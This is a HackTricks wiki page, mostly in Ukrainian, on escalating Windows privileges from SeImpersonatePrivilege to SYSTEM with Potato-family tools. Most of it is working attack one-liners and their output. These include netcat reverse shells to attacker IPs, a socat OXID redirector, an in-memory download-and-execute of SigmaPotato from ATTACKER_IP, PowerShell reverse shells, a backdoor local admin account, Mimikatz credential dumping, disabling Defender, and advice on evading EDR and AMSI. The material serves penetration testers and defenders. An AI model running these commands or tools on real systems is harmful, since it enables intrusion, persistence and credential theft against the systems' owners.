# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato не працює** на Windows Server 2019 та Windows 10 build 1809 і новіших. Однак, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** можуть бути використані для отримання тих самих привілеїв та доступу рівня `NT AUTHORITY\SYSTEM`. Цей блог-пост (https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) детально описує інструмент `PrintSpoofer`, який можна використовувати для зловживання привілеями імперсонування на хостах Windows 10 і Server 2019, де JuicyPotato більше не працює.

> [!TIP]
> Сучасною альтернативою, яка часто підтримується у 2024–2025 роках, є SigmaPotato (форк GodPotato), що додає використання in-memory/.NET reflection і розширену підтримку ОС. Див. швидке використання нижче та репозиторій у References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Вимоги та поширені підводні камені

Усі наведені нижче техніки базуються на зловживанні сервісом з привілеями, здатним до імперсонування, з контексту, що має один із цих привілеїв:

- SeImpersonatePrivilege (найпоширеніше) або SeAssignPrimaryTokenPrivilege
- Високий рівень цілісності не потрібен, якщо токен вже має SeImpersonatePrivilege (звично для багатьох сервісних облікових записів, таких як IIS AppPool, MSSQL тощо)

Швидко перевірте привілеї:
```cmd
whoami /priv | findstr /i impersonate
```
- Якщо ваш shell працює під обмеженим token, що не має SeImpersonatePrivilege (поширено для Local Service/Network Service в деяких контекстах), відновіть стандартні привілеї облікового запису за допомогою FullPowers, а потім запустіть Potato. Приклад: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer потребує, щоб служба Print Spooler була запущена і доступна через локальний RPC endpoint (spoolss). У посилених середовищах, де Spooler вимкнено після PrintNightmare, віддавайте перевагу RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato потребує OXID resolver, доступного на TCP/135. Якщо egress заблоковано, використайте redirector/port-forwarder (див. приклад нижче). Старіші збірки вимагали прапора -f.
- EfsPotato/SharpEfsPotato зловживають MS-EFSR; якщо один pipe заблоковано, спробуйте альтернативні pipe'и (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай вказує на невідому/непідтримувану службу аутентифікації RPC; спробуйте інший pipe/transport або переконайтеся, що цільова служба запущена.
- «Kitchen-sink» форки, такі як DeadPotato, додають додаткові payload-модулі (Mimikatz/SharpHound/Defender off), які торкаються диска; очікуйте вищого виявлення EDR порівняно зі спрощеними оригіналами.

## Швидка демонстрація

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Примітки:
- Ви можете використовувати -i, щоб запустити інтерактивний процес у поточній консолі, або -c, щоб виконати однорядкову команду.
- Потрібна служба Spooler. Якщо вона відключена, це не спрацює.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Якщо вихідний порт 135 заблоковано, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato — це новіший примітив зловживання COM, випущений наприкінці 2022 року, який націлений на сервіс **PrintNotify** замість Spooler/BITS. Бінарник створює екземпляр COM-сервера PrintNotify, підмінює `IUnknown` на фальшивий, а потім викликає привілейований зворотний виклик через `CreatePointerMoniker`. Коли сервіс PrintNotify (що працює як **SYSTEM**) підключається назад, процес дублює отриманий токен і запускає переданий payload з повними привілеями.

Key operational notes:

* Працює на Windows 10/11 та Windows Server 2012–2022 за умови встановленого сервісу Print Workflow/PrintNotify (він присутній навіть коли застарілий Spooler вимкнено після PrintNightmare).
* Вимагає, щоб викликаючий контекст мав **SeImpersonatePrivilege** (типово для IIS APPPOOL, MSSQL і службових облікових записів планувальника завдань).
* Підтримує як пряму команду, так і інтерактивний режим, щоб залишатися в оригінальній консолі. Приклад:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Оскільки він повністю заснований на COM, не потрібні named-pipe listeners або external redirectors, що робить його drop-in replacement на хостах, де Defender блокує RoguePotato’s RPC binding.

Оператори, такі як Ink Dragon, запускають PrintNotifyPotato одразу після отримання ViewState RCE на SharePoint, щоб перейти (pivot) від worker-процесу `w3wp.exe` до SYSTEM перед встановленням ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Порада: якщо один pipe не працює або EDR його блокує, спробуйте інші підтримувані pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Примітки:
- Працює на Windows 8/8.1–11 та Server 2012–2022, якщо присутній SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato надає два варіанти, спрямовані на об'єкти DCOM служб, які за замовчуванням використовують RPC_C_IMP_LEVEL_IMPERSONATE. Збудуйте або використайте надані binaries і запустіть вашу команду:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (оновлений форк GodPotato)

SigmaPotato додає сучасні покращення, такі як in-memory execution через .NET reflection та PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Додаткові можливості в збірках 2024–2025 (v1.2.x):
- Вбудований прапорець reverse shell `--revshell` та видалення обмеження PowerShell у 1024 символи, щоб ви могли одноразово запускати довгі AMSI-bypassing payloads.
- Синтаксис, дружній до reflection (`[SigmaPotato]::Main()`), а також елементарний трюк обходу AV через `VirtualAllocExNuma()` для збивання простих евристик.
- Окремий `SigmaPotatoCore.exe`, скомпільований проти .NET 2.0 для середовищ PowerShell Core.

### DeadPotato (переробка GodPotato 2024 з модулями)

DeadPotato зберігає ланцюжок імітації OXID/DCOM GodPotato, але додає помічників для post-exploitation, тож оператори можуть одразу отримати SYSTEM та виконати persistence/collection без додаткових інструментів.

Звичні модулі (усі вимагають SeImpersonatePrivilege):

- `-cmd "<cmd>"` — запустити довільну команду як SYSTEM.
- `-rev <ip:port>` — швидкий reverse shell.
- `-newadmin user:pass` — створити локального адміністратора для persistence.
- `-mimi sam|lsa|all` — викласти і запустити Mimikatz для dump credentials (записує на диск, шумно).
- `-sharphound` — запустити SharpHound collection як SYSTEM.
- `-defender off` — відключити Defender real-time protection (дуже шумно).

Приклади однолайнерів:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Оскільки він постачає додаткові бінарні файли, очікуйте більшої кількості спрацьовувань AV/EDR; використовуйте більш компактні GodPotato/SigmaPotato, коли важлива прихованість.

## Посилання

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
